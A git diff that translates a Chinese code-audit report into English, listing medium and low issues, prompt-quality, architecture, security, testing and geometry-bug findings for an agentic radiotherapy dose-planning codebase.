+**Fix**: Use `pip freeze > requirements.txt` or `poetry.lock`
 
 ---
 
-## 4. 中等问题 (Medium)
+## 4. Medium Issues
 
-### M-01: 死代码 — 备份文件
+### M-01: Dead Code — Backup Files
 
-**文件**: `plans/core.py.bak`, `plans/geometry.py.bak`, `plans/utilizations.py.bak`  
-**描述**: 备份文件不应存在于代码仓库中。  
-**修复**: 删除，使用 git 管理版本
+**File**: `plans/core.py.bak`, `plans/geometry.py.bak`, `plans/utilizations.py.bak`  
+**Description**: Backup files should not exist in a code repository.  
+**Fix**: Delete them and use git to manage versions
 
-### M-02: 死代码 — 调试文件
+### M-02: Dead Code — Debug Files
 
-**文件**: `debug_full_flow.py`, `debug_mask_orientation.py`, `debug_mask_orientation2.py`, `debug_live_mask.py`  
-**描述**: 调试文件不应提交到仓库。  
-**修复**: 删除或加入 `.gitignore`
+**File**: `debug_full_flow.py`, `debug_mask_orientation.py`, `debug_mask_orientation2.py`, `debug_live_mask.py`  
+**Description**: Debug files should not be committed to the repository.  
+**Fix**: Delete them or add them to `.gitignore`
 
-### M-03: 重复的剂量预测代码
+### M-03: Duplicate Dose Prediction Code
 
-**文件**: `dose_pre/` 和 `plans/dose_pre/`  
-**描述**: 两个目录包含相同的剂量预测代码：
+**File**: `dose_pre/` and `plans/dose_pre/`  
+**Description**: The two directories contain identical dose prediction code:
 - `dose_pre/functions.py`
 - `dose_pre/Predict_crop.py`
 - `dose_pre/myDoseNet.py`
 - `plans/dose_pre/functions.py`
 - `plans/dose_pre/Predict_crop.py`
 - `plans/dose_pre/myDoseNet.py`  
-**修复**: 使用单一源 + symlink 或 import
+**Fix**: Use a single source + symlink or import
 
-### M-04: 不一致的命名约定
+### M-04: Inconsistent Naming Conventions
 
-**文件**: 整个代码库  
-**描述**: 混合使用：
-- `snake_case`（Python 标准）
-- `camelCase`（JavaScript）
-- `PascalCase`（类名，但有些变量也用）
-- 中文变量名（如 `_中文变量`）
+**File**: entire codebase  
+**Description**: Mixed use of:
+- `snake_case` (Python standard)
+- `camelCase` (JavaScript)
+- `PascalCase` (class names, but also used for some variables)
+- Chinese variable names (such as `_中文变量`)
 
-**修复**: 统一使用 `snake_case`（Python）和 `camelCase`（JavaScript）
+**Fix**: Standardize on `snake_case` (Python) and `camelCase` (JavaScript)
 
-### M-05: 缺少文档字符串
+### M-05: Missing Docstrings
 
-**文件**: 多个文件  
-**描述**: 很多类和方法缺少文档字符串，特别是：
-- `tool_factory/` 中的工具
-- `memory/` 中的内存操作
-- `brain/` 中的决策器  
-**修复**: 添加完整的文档字符串
+**File**: multiple files  
+**Description**: Many classes and methods lack docstrings, especially:
+- tools in `tool_factory/`
+- memory operations in `memory/`
+- deciders in `brain/`  
+**Fix**: Add complete docstrings
 
-### M-06: 硬编码的魔法数字
+### M-06: Hardcoded Magic Numbers
 
-**文件**: 多处  
-**描述**: 
+**File**: multiple locations  
+**Description**: 
 - `AgenticSys.py:3596`: `max_iterations = 8`
 - `AgenticSys.py:471`: `max_messages = 12`
 - `AgenticSys.py:474`: `keep_last = 6`
 - `quality_gate.py:342`: `weighted_score < 5.0`
 - `quality_gate.py:349`: `weighted_score < 7.0`  
-**修复**: 提取为配置常量
+**Fix**: Extract them as configuration constants
 
-### M-07: 不一致的导入风格
+### M-07: Inconsistent Import Style
 
-**文件**: 多处  
-**描述**: 混合使用：
+**File**: multiple locations  
+**Description**: Mixed use of:
 - `import module`
 - `from module import func`
 - `from module import *`
-- 延迟导入（在函数内部）  
-**修复**: 统一导入风格
+- deferred imports (inside functions)  
+**Fix**: Standardize the import style
 
-### M-08: 缺少 __all__ 定义
+### M-08: Missing __all__ Definitions
 
-**文件**: 多个 `__init__.py`  
-**描述**: 很多包的 `__init__.py` 没有定义 `__all__`，导致 `from package import *` 导入所有内容。  
-**修复**: 添加 `__all__` 定义
+**File**: multiple `__init__.py`  
+**Description**: Many packages' `__init__.py` do not define `__all__`, causing `from package import *` to import everything.  
+**Fix**: Add `__all__` definitions
 
-### M-09: 不一致的错误消息
+### M-09: Inconsistent Error Messages
 
-**文件**: 多处  
-**描述**: 有些错误消息是中文，有些是英文，有些是中英混合。  
-**修复**: 统一错误消息语言
+**File**: multiple locations  
+**Description**: Some error messages are in Chinese, some in English, and some are mixed Chinese/English.  
+**Fix**: Standardize the error message language
 
-### M-10: 缺少日志轮转
+### M-10: Missing Log Rotation
 
-**文件**: `web/server.log`  
-**描述**: 日志文件没有轮转机制，可能无限增长。  
-**修复**: 使用 `RotatingFileHandler`
+**File**: `web/server.log`  
+**Description**: The log file has no rotation mechanism and may grow without bound.  
+**Fix**: Use `RotatingFileHandler`
 
-### M-11: 未使用的导入
+### M-11: Unused Imports
 
-**文件**: 多处  
-**描述**: 很多文件有未使用的导入。  
-**修复**: 使用 `autoflake` 清理
+**File**: multiple locations  
+**Description**: Many files have unused imports.  
+**Fix**: Clean up with `autoflake`
 
-### M-12: 缺少类型检查
+### M-12: Missing Type Checking
 
-**文件**: 多处  
-**描述**: 很多函数参数没有类型检查。  
-**修复**: 添加运行时类型检查或使用 Pydantic
+**File**: multiple locations  
+**Description**: Many function parameters have no type checking.  
+**Fix**: Add runtime type checking or use Pydantic
 
-### M-13: 不一致的缩进
+### M-13: Inconsistent Indentation
 
-**文件**: 部分 Python 文件  
-**描述**: 混合使用 4 空格和 Tab 缩进。  
-**修复**: 使用 `autopep8` 或 `black` 格式化
+**File**: some Python files  
+**Description**: Mixed use of 4-space and Tab indentation.  
+**Fix**: Format with `autopep8` or `black`
 
-### M-14: 缺少 __repr__ 方法
+### M-14: Missing __repr__ Methods
 
-**文件**: 多个数据类  
-**描述**: 很多 dataclass 没有定义 `__repr__`，调试困难。  
-**修复**: 添加 `__repr__` 方法
+**File**: multiple data classes  
+**Description**: Many dataclasses do not define `__repr__`, making debugging difficult.  
+**Fix**: Add `__repr__` methods
 
-### M-15: 不一致的 None 检查
+### M-15: Inconsistent None Checks
 
-**文件**: 多处  
-**描述**: 混合使用：
+**File**: multiple locations  
+**Description**: Mixed use of:
 - `if x is not None`
 - `if x`
 - `if x != None`  
-**修复**: 统一使用 `if x is not None`
+**Fix**: Standardize on `if x is not None`
 
-### M-16: 缺少上下文管理器
+### M-16: Missing Context Managers
 
-**文件**: 多处  
-**描述**: 文件操作没有使用 `with` 语句。  
-**修复**: 使用上下文管理器
+**File**: multiple locations  
+**Description**: File operations do not use `with` statements.  
+**Fix**: Use context managers
 
-### M-17: 不一致的字符串格式化
+### M-17: Inconsistent String Formatting
 
-**文件**: 多处  
-**描述**: 混合使用：
+**File**: multiple locations  
+**Description**: Mixed use of:
 - f-string
 - `.format()`
-- `%` 格式化  
-**修复**: 统一使用 f-string
+- `%` formatting  
+**Fix**: Standardize on f-strings
 
-### M-18: 缺少 __init__ 参数验证
+### M-18: Missing __init__ Parameter Validation
 
-**文件**: 多个类  
-**描述**: 很多类的 `__init__` 不验证参数。  
-**修复**: 添加参数验证
+**File**: multiple classes  
+**Description**: Many classes' `__init__` do not validate parameters.  
+**Fix**: Add parameter validation
 
-### M-19: 不一致的返回类型
+### M-19: Inconsistent Return Types
 
-**文件**: 多处  
-**描述**: 有些函数在成功时返回值，失败时返回 None，有些抛出异常。  
-**修复**: 统一返回类型
+**File**: multiple locations  
+**Description**: Some functions return a value on success and None on failure, while others throw exceptions.  
+**Fix**: Standardize return types
 
-### M-20: 缺少 __enter__/__exit__ 方法
+### M-20: Missing __enter__/__exit__ Methods
 
-**文件**: 多个资源管理类  
-**描述**: 需要上下文管理器的类没有实现 `__enter__`/`__exit__`。  
-**修复**: 添加上下文管理器支持
+**File**: multiple resource management classes  
+**Description**: Classes that need context managers do not implement `__enter__`/`__exit__`.  
+**Fix**: Add context manager support
 
-### M-21: 不一致的异常链
+### M-21: Inconsistent Exception Chaining
 
-**文件**: 多处  
-**描述**: 有些地方使用 `raise X from Y`，有些没有。  
-**修复**: 统一异常链
+**File**: multiple locations  
+**Description**: Some places use `raise X from Y`, some do not.  
+**Fix**: Standardize exception chaining
 
-### M-22: 缺少 __slots__
+### M-22: Missing __slots__
 
-**文件**: 多个频繁实例化的类  
-**描述**: 没有使用 `__slots__` 优化内存。  
-**修复**: 为频繁实例化的类添加 `__slots__`
+**File**: multiple frequently instantiated classes  
+**Description**: `__slots__` is not used to optimize memory.  
+**Fix**: Add `__slots__` to frequently instantiated classes
 
-### M-23: 不一致的 __eq__ 实现
+### M-23: Inconsistent __eq__ Implementations
 
-**文件**: 多个数据类  
-**描述**: 有些 dataclass 自定义了 `__eq__`，有些没有。  
-**修复**: 统一 `__eq__` 实现
+**File**: multiple data classes  
+**Description**: Some dataclasses customize `__eq__`, some do not.  
+**Fix**: Standardize `__eq__` implementations
 
-### M-24: 缺少 __hash__ 实现
+### M-24: Missing __hash__ Implementations
 
-**文件**: 多个数据类  
-**描述**: 自定义了 `__eq__` 但没有 `__hash__`。  
-**修复**: 添加 `__hash__` 或设置 `unhashable=True`
-
----
-
-## 5. 低危问题 (Low)
-
-### L-01: 冗余的 `import numpy as np`
-
-**文件**: `AgenticSys.py` 多处  
-**描述**: 在函数内部重复导入 numpy。  
-**修复**: 在文件顶部导入一次
-
-### L-02: 不一致的引号风格
-
-**文件**: 多处  
-**描述**: 混合使用单引号和双引号。  
-**修复**: 使用 `black` 统一
-
-### L-03: 缺少模块级文档字符串
-
-**文件**: 多个文件  
-**描述**: 很多文件缺少模块级文档字符串。  
-**修复**: 添加模块级文档字符串
-
-### L-04: 不一致的空行
-
-**文件**: 多处  
-**描述**: 函数之间空行数量不一致。  
-**修复**: 使用 `autopep8` 格式化
-
-### L-05: 缺少 __version__
-
-**文件**: 多个包  
-**描述**: 很多包没有定义 `__version__`。  
-**修复**: 添加 `__version__`
-
-### L-06: 不一致的 __init__ 参数顺序
-
-**文件**: 多个类  
-**描述**: 参数顺序不一致。  
-**修复**: 统一参数顺序
-
-### L-07: 缺少 __all__ 导出
-
-**文件**: 多个模块  
-**描述**: 没有定义 `__all__`。  
-**修复**: 添加 `__all__`
-
-### L-08: 不一致的 __repr__ 格式
-
-**文件**: 多个类  
-**描述**: `__repr__` 格式不一致。  
-**修复**: 统一格式
-
-### L-09: 缺少 __str__ 方法
-
-**文件**: 多个类  
-**描述**: 没有定义 `__str__`。  
-**修复**: 添加 `__str__`
-
-### L-10: 不一致的 __eq__ 比较
-
-**文件**: 多个类  
-**描述**: `__eq__` 比较逻辑不一致。  
-**修复**: 统一比较逻辑
-
-### L-11: 缺少 __hash__ 实现
-
-**文件**: 多个类  
-**描述**: 没有实现 `__hash__`。  
-**修复**: 添加 `__hash__`
-
-### L-12: 不一致的 __lt__ 实现
-
-**文件**: 多个可排序类  
-**描述**: `__lt__` 实现不一致。  
-**修复**: 统一排序逻辑
-
-### L-13: 缺少 __le__/__ge__/__gt__ 方法
-
-**文件**: 多个可比较类  
-**描述**: 只实现了 `__lt__`，缺少其他比较方法。  
-**修复**: 使用 `@functools.total_ordering`
-
-### L-14: 不一致的 __contains__ 实现
-
-**文件**: 多个容器类  
-**描述**: `__contains__` 实现不一致。  
-**修复**: 统一实现
-
-### L-15: 缺少 __iter__ 方法
-
-**文件**: 多个可迭代类  
-**描述**: 没有实现 `__iter__`。  
-**修复**: 添加 `__iter__`
+**File**: multiple data classes  
+**Description**: `__eq__` is customized but `__hash__` is not.  
+**Fix**: Add `__hash__` or set `unhashable=True`
 
 ---
 
-## 6. Prompt 质量审查
+## 5. Low Issues
 
-### P-01: System Prompt 过长
+### L-01: Redundant `import numpy as np`
 
-**文件**: `config/prompts/system_prompt.md`  
-**描述**: 核心 system prompt 约 100 行，加上按需加载的模块，总 prompt 可能超过 2000 行。这会消耗大量 token。  
-**修复**: 精简 prompt，移除冗余内容
+**File**: `AgenticSys.py` multiple locations  
+**Description**: numpy is repeatedly imported inside functions.  
+**Fix**: Import once at the top of the file
 
-### P-02: Prompt 模块触发逻辑过于宽泛
+### L-02: Inconsistent Quote Style
 
-**文件**: `config/prompts/__init__.py:52-112`  
-**描述**: `_MODULE_TRIGGERS` 使用正则表达式匹配，有些模式过于宽泛。例如：
+**File**: multiple locations  
+**Description**: Mixed use of single and double quotes.  
+**Fix**: Standardize with `black`
+
+### L-03: Missing Module-Level Docstrings
+
+**File**: multiple files  
+**Description**: Many files lack module-level docstrings.  
+**Fix**: Add module-level docstrings
+
+### L-04: Inconsistent Blank Lines
+
+**File**: multiple locations  
+**Description**: The number of blank lines between functions is inconsistent.  
+**Fix**: Format with `autopep8`
+
+### L-05: Missing __version__
+
+**File**: multiple packages  
+**Description**: Many packages do not define `__version__`.  
+**Fix**: Add `__version__`
+
+### L-06: Inconsistent __init__ Parameter Order
+
+**File**: multiple classes  
+**Description**: Parameter order is inconsistent.  
+**Fix**: Standardize parameter order
+
+### L-07: Missing __all__ Exports
+
+**File**: multiple modules  
+**Description**: `__all__` is not defined.  
+**Fix**: Add `__all__`
+
+### L-08: Inconsistent __repr__ Format
+
+**File**: multiple classes  
+**Description**: `__repr__` format is inconsistent.  
+**Fix**: Standardize the format
+
+### L-09: Missing __str__ Methods
+
+**File**: multiple classes  
+**Description**: `__str__` is not defined.  
+**Fix**: Add `__str__`
+
+### L-10: Inconsistent __eq__ Comparisons
+
+**File**: multiple classes  
+**Description**: `__eq__` comparison logic is inconsistent.  
+**Fix**: Standardize the comparison logic
+
+### L-11: Missing __hash__ Implementations
+
+**File**: multiple classes  
+**Description**: `__hash__` is not implemented.  
+**Fix**: Add `__hash__`
+
+### L-12: Inconsistent __lt__ Implementations
+
+**File**: multiple sortable classes  
+**Description**: `__lt__` implementations are inconsistent.  
+**Fix**: Standardize the ordering logic
+
+### L-13: Missing __le__/__ge__/__gt__ Methods
+
+**File**: multiple comparable classes  
+**Description**: Only `__lt__` is implemented, missing the other comparison methods.  
+**Fix**: Use `@functools.total_ordering`
+
+### L-14: Inconsistent __contains__ Implementations
+
+**File**: multiple container classes  
+**Description**: `__contains__` implementations are inconsistent.  
+**Fix**: Standardize the implementation
+
+### L-15: Missing __iter__ Methods
+
+**File**: multiple iterable classes  
+**Description**: `__iter__` is not implemented.  
+**Fix**: Add `__iter__`
+
+---
+
+## 6. Prompt Quality Review
+
+### P-01: System Prompt Too Long
+
+**File**: `config/prompts/system_prompt.md`  
+**Description**: The core system prompt is about 100 lines; combined with on-demand modules, the total prompt may exceed 2000 lines. This consumes a large number of tokens.  
+**Fix**: Streamline the prompt and remove redundant content
+
+### P-02: Prompt Module Trigger Logic Too Broad
+
+**File**: `config/prompts/__init__.py:52-112`  
+**Description**: `_MODULE_TRIGGERS` uses regular expression matching, and some patterns are too broad. For example:
 ```python
 "clinical_kb": [
     r"(?:剂量约束|剂量限制|器官耐受|处方剂量|剂量标准|剂量要求|耐受量|耐受剂量)",
 ]
 ```
-"剂量"这个词会触发 `clinical_kb` 模块，即使用户只是在问剂量计算方法。  
-**修复**: 使用更精确的匹配模式
+The word "剂量" (dose) triggers the `clinical_kb` module even when the user is only asking about dose calculation methods.  
+**Fix**: Use more precise match patterns
 
-### P-03: 缺少 Prompt 版本控制
+### P-03: Missing Prompt Version Control
 
-**文件**: `config/prompts/`  
-**描述**: Prompt 文件没有版本控制，修改后无法回滚。  
-**修复**: 使用 git 管理 prompt 版本
+**File**: `config/prompts/`  
+**Description**: Prompt files have no version control and cannot be rolled back after modification.  
+**Fix**: Use git to manage prompt versions
 
-### P-04: 缺少 Prompt 测试
+### P-04: Missing Prompt Tests
 
-**文件**: 无  
-**描述**: 没有针对 prompt 的单元测试。  
-**修复**: 添加 prompt 回归测试
+**File**: none  
+**Description**: There are no unit tests for prompts.  
+**Fix**: Add prompt regression tests
 
-### P-05: 不一致的 Prompt 语言
+### P-05: Inconsistent Prompt Language
 
-**文件**: `config/prompts/`  
-**描述**: 有些 prompt 是中文，有些是英文，有些是中英混合。  
-**修复**: 统一 prompt 语言
+**File**: `config/prompts/`  
+**Description**: Some prompts are in Chinese, some in English, and some are mixed Chinese/English.  
+**Fix**: Standardize the prompt language
 
-### P-06: 缺少 Prompt 文档
+### P-06: Missing Prompt Documentation
 
-**文件**: `config/prompts/`  
-**描述**: 没有文档说明每个 prompt 的用途和触发条件。  
-**修复**: 添加 prompt 文档
+**File**: `config/prompts/`  
+**Description**: There is no documentation explaining the purpose and trigger conditions of each prompt.  
+**Fix**: Add prompt documentation
 
-### P-07: 硬编码的 Prompt 片段
+### P-07: Hardcoded Prompt Fragments
 
-**文件**: `AgenticSys.py` 多处  
-**描述**: 很多 prompt 片段硬编码在代码中，而不是在 `config/prompts/` 目录。例如：
+**File**: `AgenticSys.py` multiple locations  
+**Description**: Many prompt fragments are hardcoded in the code rather than in the `config/prompts/` directory. For example:
 - `AgenticSys.py:1193-1254` (planning synthesis prompt)
 - `AgenticSys.py:3825-3846` (present instruction)
 - `AgenticSys.py:3358-3362` (no files override)  
-**修复**: 提取到配置文件
+**Fix**: Extract them to configuration files
 
-### P-08: 缺少 Prompt 模板变量验证
+### P-08: Missing Prompt Template Variable Validation
 
-**文件**: `config/prompts/__init__.py`  
-**描述**: `SYSTEM_PROMPT_TEMPLATE.format()` 不验证必需的模板变量是否存在。  
-**修复**: 添加变量验证
+**File**: `config/prompts/__init__.py`  
+**Description**: `SYSTEM_PROMPT_TEMPLATE.format()` does not validate whether required template variables exist.  
+**Fix**: Add variable validation
 
-### P-09: Prompt 注入防护不完整
+### P-09: Incomplete Prompt Injection Protection
 
-**文件**: `config/prompts/security.md`  
-**描述**: 虽然有安全 prompt，但没有覆盖所有注入向量。例如：
-- Unicode 同形字攻击
-- 多语言混合注入
-- 编码绕过  
-**修复**: 增强安全 prompt
+**File**: `config/prompts/security.md`  
+**Description**: Although there is a security prompt, it does not cover all injection vectors. For example:
+- Unicode homoglyph attacks
+- Multilingual mixed injection
+- Encoding bypass  
+**Fix**: Strengthen the security prompt
 
-### P-10: 缺少 Prompt 性能监控
+### P-10: Missing Prompt Performance Monitoring
 
-**文件**: 无  
-**描述**: 没有监控 prompt 的 token 使用量和响应质量。  
-**修复**: 添加性能监控
-
----
-
-## 7. 架构问题
-
-### A-01: 单体架构
-
-**描述**: 整个系统是一个单体应用，所有功能耦合在一起。  
-**影响**: 难以扩展、难以测试、难以部署  
-**修复**: 采用微服务架构
-
-### A-02: 缺少依赖注入
-
-**描述**: 大量使用全局变量和硬编码依赖。  
-**影响**: 测试困难、耦合度高  
-**修复**: 使用依赖注入框架
-
-### A-03: 缺少事件驱动架构
-
-**描述**: 工具执行是同步的，没有事件驱动机制。  
-**影响**: 性能瓶颈、扩展困难  
-**修复**: 使用事件驱动架构
-
-### A-04: 缺少缓存层
-
-**描述**: 没有统一的缓存层，每个模块自己实现缓存。  
-**影响**: 缓存不一致、内存浪费  
-**修复**: 使用统一的缓存层（如 Redis）
-
-### A-05: 缺少配置管理
-
-**描述**: 配置分散在多个文件中，没有统一的配置管理。  
-**影响**: 配置不一致、难以管理  
-**修复**: 使用配置管理框架（如 `pydantic-settings`）
-
-### A-06: 缺少健康检查
-
-**描述**: 没有健康检查端点。  
-**影响**: 难以监控系统状态  
-**修复**: 添加 `/health` 端点
-
-### A-07: 缺少指标收集
-
-**描述**: 没有统一的指标收集机制。  
-**影响**: 难以监控系统性能  
-**修复**: 使用 Prometheus 等监控工具
-
-### A-08: 缺少分布式追踪
-
-**描述**: 没有分布式追踪机制。  
-**影响**: 难以调试跨服务调用  
-**修复**: 使用 OpenTelemetry 等追踪工具
+**File**: none  
+**Description**: There is no monitoring of prompt token usage or response quality.  
+**Fix**: Add performance monitoring
 
 ---
 
-## 8. 代码质量与技术债
+## 7. Architecture Issues
 
-### T-01: 重复代码
+### A-01: Monolithic Architecture
 
-**位置**: 多处  
-**描述**: 大量重复代码，特别是：
-- 工具注册（20+ 次重复）
-- 错误处理（30+ 次重复）
-- 响应格式化（10+ 次重复）  
-**修复**: 提取公共函数
+**Description**: The entire system is a monolithic application with all functionality coupled together.  
+**Impact**: Hard to extend, hard to test, hard to deploy  
+**Fix**: Adopt a microservices architecture
 
-### T-02: 过长的函数
+### A-02: Missing Dependency Injection
 
-**位置**: 多处  
-**描述**: 很多函数超过 100 行，例如：
-- `_run_llm_function_calling_stream()` (~400 行)
-- `_execute_tool_with_memory()` (~500 行)
-- `_build_planning_report()` (~200 行)  
-**修复**: 拆分为更小的函数
+**Description**: Heavy use of global variables and hardcoded dependencies.  
+**Impact**: Difficult testing, high coupling  
+**Fix**: Use a dependency injection framework
 
-### T-03: 过深的嵌套
+### A-03: Missing Event-Driven Architecture
 
-**位置**: 多处  
-**描述**: 有些函数有 5+ 层嵌套。  
-**修复**: 使用 early return 减少嵌套
+**Description**: Tool execution is synchronous with no event-driven mechanism.  
+**Impact**: Performance bottlenecks, difficult scaling  
+**Fix**: Use an event-driven architecture
 
-### T-04: 缺少类型提示
+### A-04: Missing Cache Layer
 
-**位置**: 大部分代码  
-**描述**: 很多函数缺少类型提示。  
-**修复**: 添加类型提示
+**Description**: There is no unified cache layer; each module implements its own caching.  
+**Impact**: Inconsistent caching, wasted memory  
+**Fix**: Use a unified cache layer (such as Redis)
 
-### T-05: 缺少文档
+### A-05: Missing Configuration Management
 
-**位置**: 大部分代码  
-**描述**: 很多模块和函数缺少文档。  
-**修复**: 添加文档
+**Description**: Configuration is scattered across multiple files with no unified configuration management.  
+**Impact**: Inconsistent configuration, hard to manage  
+**Fix**: Use a configuration management framework (such as `pydantic-settings`)
 
-### T-06: 缺少测试
+### A-06: Missing Health Check
 
-**位置**: 整个项目  
-**描述**: 测试覆盖率低。  
-**修复**: 增加测试
+**Description**: There is no health check endpoint.  
+**Impact**: Difficult to monitor system status  
+**Fix**: Add a `/health` endpoint
 
-### T-07: 缺少代码审查
+### A-07: Missing Metrics Collection
 
-**位置**: 整个项目  
-**描述**: 没有代码审查流程。  
-**修复**: 建立代码审查流程
+**Description**: There is no unified metrics collection mechanism.  
+**Impact**: Difficult to monitor system performance  
+**Fix**: Use monitoring tools such as Prometheus
 
-### T-08: 缺少 CI/CD
+### A-08: Missing Distributed Tracing
 
-**位置**: 整个项目  
-**描述**: 没有 CI/CD 流程。  
-**修复**: 建立 CI/CD 流程
+**Description**: There is no distributed tracing mechanism.  
+**Impact**: Difficult to debug cross-service calls  
+**Fix**: Use tracing tools such as OpenTelemetry
 
 ---
 
-## 9. 安全问题
+## 8. Code Quality and Technical Debt
 
-### S-01: 无身份认证
+### T-01: Duplicate Code
 
-**文件**: `web/server.py`  
-**描述**: API 端点没有身份认证。  
-**修复**: 实现 JWT 或 API Key 认证
+**Location**: multiple locations  
+**Description**: Extensive duplicate code, especially:
+- Tool registration (20+ repetitions)
+- Error handling (30+ repetitions)
+- Response formatting (10+ repetitions)  
+**Fix**: Extract common functions
 
-### S-02: 无授权控制
+### T-02: Overly Long Functions
 
-**文件**: `web/server.py`  
-**描述**: 没有基于角色的访问控制。  
-**修复**: 实现 RBAC
+**Location**: multiple locations  
+**Description**: Many functions exceed 100 lines, for example:
+- `_run_llm_function_calling_stream()` (~400 lines)
+- `_execute_tool_with_memory()` (~500 lines)
+- `_build_planning_report()` (~200 lines)  
+**Fix**: Split into smaller functions
 
-### S-03: 无审计日志
+### T-03: Excessive Nesting
 
-**文件**: 整个系统  
-**描述**: 没有审计日志记录谁做了什么。  
-**修复**: 实现审计日志
+**Location**: multiple locations  
+**Description**: Some functions have 5+ levels of nesting.  
+**Fix**: Use early returns to reduce nesting
 
-### S-04: 无数据加密
+### T-04: Missing Type Hints
 
-**文件**: 整个系统  
-**描述**: 数据在传输和存储时没有加密。  
-**修复**: 实现 TLS 和数据加密
+**Location**: most of the code  
+**Description**: Many functions lack type hints.  
+**Fix**: Add type hints
 
-### S-05: 无输入验证
+### T-05: Missing Documentation
 
-**文件**: 多处  
-**描述**: 没有统一的输入验证机制。  
-**修复**: 实现输入验证
+**Location**: most of the code  
+**Description**: Many modules and functions lack documentation.  
+**Fix**: Add documentation
 
-### S-06: 无输出编码
+### T-06: Missing Tests
 
-**文件**: 多处  
-**描述**: 没有统一的输出编码机制。  
-**修复**: 实现输出编码
+**Location**: entire project  
+**Description**: Test coverage is low.  
+**Fix**: Add tests
 
-### S-07: 无 CSRF 防护
+### T-07: Missing Code Review
 
-**文件**: `web/server.py`  
-**描述**: 没有 CSRF 防护。  
-**修复**: 实现 CSRF token
+**Location**: entire project  
+**Description**: There is no code review process.  
+**Fix**: Establish a code review process
 
-### S-08: 无速率限制
+### T-08: Missing CI/CD
 
-**文件**: `web/server.py`  
-**描述**: 没有速率限制。  
-**修复**: 实现速率限制
-
----
-
-## 10. 测试与基准测试问题
-
-### B-01: 测试覆盖率不足
-
-**描述**: 只有 5 个测试文件，覆盖率低。  
-**修复**: 增加测试
-
-### B-02: 基准测试可游戏性
-
-**描述**: 基准测试使用关键词匹配，容易被游戏。  
-**修复**: 使用更 robust 的评估方法
-
-### B-03: 缺少集成测试
-
-**描述**: 没有端到端集成测试。  
-**修复**: 添加集成测试
-
-### B-04: 缺少性能测试
-
-**描述**: 没有性能测试。  
-**修复**: 添加性能测试
-
-### B-05: 缺少安全测试
-
-**描述**: 没有安全测试。  
-**修复**: 添加安全测试
+**Location**: entire project  
+**Description**: There is no CI/CD process.  
+**Fix**: Establish a CI/CD process
 
 ---
 
-## 11. plans/ 子系统深度审查 (90 个问题)
+## 9. Security Issues
 
-> 由并行子 Agent 深度审查 `skills/` 和 `plans/` 所有文件发现。
+### S-01: No Authentication
+
+**File**: `web/server.py`  
+**Description**: API endpoints have no authentication.  
+**Fix**: Implement JWT or API Key authentication
+
+### S-02: No Authorization Control
+
+**File**: `web/server.py`  
+**Description**: There is no role-based access control.  
+**Fix**: Implement RBAC
+
+### S-03: No Audit Logging
+
+**File**: entire system  
+**Description**: There is no audit log recording who did what.  
+**Fix**: Implement audit logging
+
+### S-04: No Data Encryption
+
+**File**: entire system  
+**Description**: Data is not encrypted in transit or at rest.  
+**Fix**: Implement TLS and data encryption
+
+### S-05: No Input Validation
+
+**File**: multiple locations  
+**Description**: There is no unified input validation mechanism.  
+**Fix**: Implement input validation
+
+### S-06: No Output Encoding
+
+**File**: multiple locations  
+**Description**: There is no unified output encoding mechanism.  
+**Fix**: Implement output encoding
+
+### S-07: No CSRF Protection
+
+**File**: `web/server.py`  
+**Description**: There is no CSRF protection.  
+**Fix**: Implement CSRF tokens
+
+### S-08: No Rate Limiting
+
+**File**: `web/server.py`  
+**Description**: There is no rate limiting.  
+**Fix**: Implement rate limiting
+
+---
+
+## 10. Testing and Benchmark Issues
+
+### B-01: Insufficient Test Coverage
+
+**Description**: Only 5 test files with low coverage.  
+**Fix**: Add tests
+
+### B-02: Benchmark Gameability
+
+**Description**: Benchmarks use keyword matching and are easy to game.  
+**Fix**: Use more robust evaluation methods
+
+### B-03: Missing Integration Tests
+
+**Description**: There are no end-to-end integration tests.  
+**Fix**: Add integration tests
+
+### B-04: Missing Performance Tests
+
+**Description**: There are no performance tests.  
+**Fix**: Add performance tests
+
+### B-05: Missing Security Tests
+
+**Description**: There are no security tests.  
+**Fix**: Add security tests
+
+---
+
+## 11. plans/ Subsystem Deep Review (90 issues)
+
+> Discovered by parallel sub-Agents performing deep review of all files under `skills/` and `plans/`.
 
 ### plans/core.py
 
-| # | 行号 | 严重度 | 问题 |
+| # | Lines | Severity | Issue |
 |---|------|--------|------|
-| 1 | 82-98 | 🔴 High | `init_plan` 中 `while close_points.shape[0] > max_points_num` 可能无限循环 — 如果 `extract_angle` 递增不能减少点数，或 `max_points_num=0`（当 `len(candidate_dirs) > maximum_candidate_trajectories` 时整除为 0）|
-| 2 | 148-151 | 🟡 Medium | `stage1_count > 100` 硬限制，无日志警告，计划可能不完整 |
-| 3 | 198-200 | 🟡 Medium | Stage 2 静默捕获所有异常并回退到原始计划，不记录错误 |
+| 1 | 82-98 | 🔴 High | `while close_points.shape[0] > max_points_num` in `init_plan` may loop infinitely — if incrementing `extract_angle` does not reduce the point count, or `max_points_num=0` (integer division yields 0 when `len(candidate_dirs) > maximum_candidate_trajectories`) |
+| 2 | 148-151 | 🟡 Medium | `stage1_count > 100` hard limit with no log warning; the plan may be incomplete |
+| 3 | 198-200 | 🟡 Medium | Stage 2 silently catches all exceptions and falls back to the original plan without logging the error |
 
 ### plans/geometry.py
 
-| # | 行号 | 严重度 | 问题 |
+| # | Lines | Severity | Issue |
 |---|------|--------|------|
-| 4 | 1,5,7 | 🔵 Low | 三次 `import numpy as np`，冗余导入 |
-| 5 | 40 | 🟡 Medium | 体素到世界坐标变换使用 `::-1` 反转，无输入验证，极其脆弱 |
-| 6 | 196-215 | 🟡 Medium | `calculate_surface_normals` 分母中 `1e-6` 添加了两次 |
-| 7 | 467-479 | 🟡 Medium | `compute_normal` 在平坦区域（梯度为 0）会产生 NaN，无零值检查 |
-| 8 | 492-503 | 🔴 High | 射线生成中的共线性检查是 O(N²)，浮点 `==` 比较不可靠 |
-| 9 | 692-726 | 🟡 Medium | `compute_convex_hull_mask_from_array` 在共面点上崩溃（如单层 mask）|
-| 10 | 1280-1322 | 🟡 Medium | `ray_to_ray_distance` 平行情况计算不正确 |
-| 11 | 1417-1436 | 🔵 Low | `bandpass_filter` 未被调用，死代码 |
-| 12 | 1440-1464 | 🔵 Low | `distance_filter` 文档说返回 1e-6 但代码返回 0 |
+| 4 | 1,5,7 | 🔵 Low | Three `import numpy as np`, redundant imports |
+| 5 | 40 | 🟡 Medium | Voxel-to-world coordinate transform uses `::-1` reversal with no input validation, extremely fragile |
+| 6 | 196-215 | 🟡 Medium | `1e-6` is added twice in the denominator of `calculate_surface_normals` |
+| 7 | 467-479 | 🟡 Medium | `compute_normal` produces NaN in flat regions (zero gradient), no zero-value check |
